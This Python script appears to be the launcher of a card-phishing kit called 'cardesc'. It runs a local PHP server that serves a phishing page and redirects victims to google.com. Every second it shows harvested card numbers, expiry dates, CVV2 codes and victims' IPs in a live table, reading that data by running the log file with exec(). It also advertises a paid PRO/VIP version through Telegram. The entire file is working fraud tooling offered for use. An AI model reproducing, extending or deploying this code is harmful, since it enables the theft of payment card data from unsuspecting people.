import os, time
from multiprocessing import Process
from prettytable import PrettyTable
import json
import requests
import webbrowser

os.system('clear || cls')
with open("dist/log.log", "w") as dist:
    pass
with open("dist/location.location", 'w') as loca:
    loca.write("https://google.com")

class A:
    def __call__(self):
        os.system("cd dist && php -S localhost:"+str(ports))
class B:
    def __call__(self):
        while True:
            x = PrettyTable()
            x.field_names = ['os', 'number', 'date', 'cvv2', 'ip']
            exec(open('dist/log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear || cls")
def del_upd():
    try:
        print("[>] Start Auto Update ")
        print(" | Please wait for the new version to install")
        os.system("git checkout . && git pull")
        print(" | Success update and install cardesc \n|\n[>] author @oldnum thank you for being with us :>")
    except:
        print(' |--> Please install (copy to run command)  : cd .. && rm -rf cardesc && git clone https://github.com/oldnum/cardesc && cd cardesc')
with open('info/metadata.json') as data:
    meta = json.load(data)
def upd():
    try:
        rqst = requests.get(f"{meta['url']}", timeout=5)
        meta_sc = rqst.status_code
        if meta_sc == 200:
            metadata = rqst.text
            json_data = json.loads(metadata)
            gh_version = json_data['version']
            if (str(gh_version) > meta['version']):
                os.system('clear || cls')
                print(logo)
                print(f'\n[>]New Update Available : {gh_version}')
                print(' | Details     : https://github.com/oldnum/cardesc')
                del_upd()   
                exit()
            else:
                pass
    except Exception as exc:
        print(f'Exception : {str(exc)}')
        exit()
logo=(f"""\n
┌─┐┌─┐┬─┐┌┬┐┌─┐┌─┐┌─┐
│  ├─┤├┬┘ ││├┤ └─┐│  
└─┘┴ ┴┴└──┴┘└─┘└─┘└─┘
[>] Version     : {meta['version']} 
 |--> btc: {meta['donate']['btc']}          
 |--> eth: {meta['donate']['eth']}
[>] Telegram    : {meta['telegram']}
 |--> status: {meta['status']}
 # buy PRO or VIP in telegram :>\n""")
print(logo)
upd()
print("""
[0] History Bank
[1] Card Pay
[2] Buy PRO/VIP version
""")
used = input("num lock: ")
if used=='0':
    upd()
    os.system('clear || cls')
    print(logo)
    with open('result.log', 'r') as res:
        print(res.read())
elif used=='1':
    try:
        ports = int(input("ports: "))
    except:
        ports=8080
    a = A()
    b = B()

    p1 = Process(target=a)
    p2 = Process(target=b)
    p1.start()
    p2.start()

    p1.join()
    p2.join()
elif used == '2':
    upd()
    os.system('clear || cls')
    print(logo)
    print("I am waiting for you in Telegram to receive PRO version\n |-> @oldnum")
    time.sleep(1)
    try:
        webbrowser.open(f"https://{meta['telegram']}", new=2)
    except:
        os.system(f"start  https://{meta['telegram']}")
    exit()  
else:
    os.system("clear || cls")
    print(logo)
    exit()